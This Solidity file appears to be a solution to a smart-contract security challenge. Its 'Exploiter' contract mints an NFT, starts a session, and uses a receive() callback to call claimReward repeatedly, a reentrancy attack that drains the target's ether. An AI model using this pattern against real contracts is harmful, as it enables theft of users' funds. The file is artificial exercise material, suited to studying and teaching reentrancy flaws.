// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IPomodoro} from "src/0xjarix-pomodoro/interfaces/IPomodoro.sol";
import {IPomodoroNFT} from "src/0xjarix-pomodoro/interfaces/IPomodoroNFT.sol";

import {Test, console2} from "forge-std/Test.sol";

contract Exploiter {
    IPomodoro pomodoro;
    IPomodoroNFT pomodoroNFT;

    constructor(address _pomodoro, address _pomodoroNFT) {
        pomodoro = IPomodoro(_pomodoro);
        pomodoroNFT = IPomodoroNFT(_pomodoroNFT);
    }

    function mintAndStartWorkSession() external payable {
        pomodoroNFT.mint{value: 0.1 ether}(address(this));
        pomodoro.startWorkSession(4);
    }

    function attack() external {
        pomodoro.claimReward(4);
    }

    receive() external payable {
        if (address(pomodoro).balance > 0) {
            pomodoro.claimReward(4);
        }
    }
}
